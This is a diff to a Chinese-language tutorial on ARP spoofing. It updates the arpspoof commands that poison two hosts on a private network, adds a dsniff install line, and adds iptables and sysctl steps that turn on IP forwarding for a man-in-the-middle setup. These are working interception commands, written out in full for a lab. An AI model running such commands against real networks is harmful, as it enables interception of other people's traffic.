@@ -86,9 +86,11 @@
 	:::
 
 	```shell
+	# sudo apt-get install dsniff
 	# 第一个ip是欺诈的主机, 第二个ip是要伪装的主机
-	arpspoof -i eth1 -t 192.168.12.194 192.168.12.254
-	arpspoof -i eth1 -t 192.168.12.254 192.168.12.194
+	# -i 为网口
+	sudo arpspoof -i enp4s0 -t 192.168.12.194 192.168.12.254
+	sudo arpspoof -i enp4s0 -t 192.168.12.254 192.168.12.194
 	```
 
 ## 路由
@@ -102,5 +104,20 @@
 - 开启路由转发
 
 	```shell
+	# 查看iptables FORWARD 默认规则
+	sudo iptables -nL
+	# > Chain FORWARD (policy DROP)
+	# > target     prot opt source               destination
+	# ...
+
+	# 如果不是ACCEPT,打开路过许可:
+	sudo iptables -P FORWARD ACCEPT
+
+	# 查看转发使能是否打开
+	sudo sysctl net.ipv4.ip_forward
+	# 查看转发使能是否打开
+	sudo sysctl -w net.ipv4.ip_forward=1
+
+	# 或使用以下方法打开
 	echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
 	```
